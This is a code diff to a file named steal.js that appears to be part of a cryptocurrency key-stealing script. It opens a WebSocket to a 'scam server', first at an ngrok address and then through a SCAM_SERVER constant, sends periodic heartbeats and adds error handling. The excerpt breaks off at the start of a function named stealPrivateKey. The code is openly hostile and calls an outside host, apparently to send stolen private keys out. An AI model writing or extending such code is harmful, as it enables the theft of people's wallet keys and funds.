@@ -1,11 +1,16 @@
 console.log("steal.js is loaded! Connecting to scam server...");
 
-const socket = new WebSocket("wss://randomsub.ngrok.io");
+const socket = new WebSocket(SCAM_SERVER);
 
 socket.onopen = () => {
     console.log("WebSocket connected!");
     setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
 };
+
+socket.onerror = (error) => {
+    console.error("WebSocket Error:", error);
+};
+
 
 async function stealPrivateKey() {
     try {
